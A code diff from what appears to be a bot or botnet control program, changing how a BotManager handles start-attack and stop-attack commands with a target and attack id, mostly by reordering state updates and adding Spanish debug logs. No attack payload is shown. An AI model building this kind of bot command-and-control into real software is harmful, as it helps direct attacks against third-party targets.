@@ -65,20 +65,27 @@ void BotManager::commandReceivedOnBot(Message *command)
                  << "attackId:" << _bot -> attack().id()
                  << "target:" << _bot -> attack().target();
     } else if(StartAttackCommand *startAttackCommand = dynamic_cast<StartAttackCommand *>(command)) {
-        response = new AttackStartedResponse(command -> id());
-        _bot -> setState(AttackInProgress);
-        _bot -> setAttack(Attack(startAttackCommand -> id(), startAttackCommand -> target()));
+        response = new AttackStartedResponse(startAttackCommand -> id());
 
         qDebug() << "Recibido START_ATTACK_CMD de" << startAttackCommand -> from()
                  << "con id:" << startAttackCommand -> id()
                  << "target:" << startAttackCommand -> target();
+
+        _bot -> setState(AttackInProgress);
+        _bot -> setAttack(Attack(startAttackCommand -> id(), startAttackCommand -> target()));
+
+        qDebug() << "Iniciando ataque id:" << _bot -> attack().id() << "target:" << _bot -> attack().target();
+
         qDebug() << "Enviado ATTACK_STARTED_RES";
     } else if(dynamic_cast<StopAttackCommand *>(command)) {
         response = new AttackStoppedResponse(command -> id());
+
+        qDebug() << "Recibido STOP_ATTACK_CMD de" << command -> from();
+        qDebug() << "Parando ataque id:" << _bot -> attack().id() << "target:" << _bot -> attack().target();
+
         _bot -> setState(WaitingForCommand);
         _bot -> setAttack(Attack());
 
-        qDebug() << "Recibido STOP_ATTACK_CMD de" << command -> from();
         qDebug() << "Enviado ATTACK_STOPPED_RES";
     } else
         isValid = false;
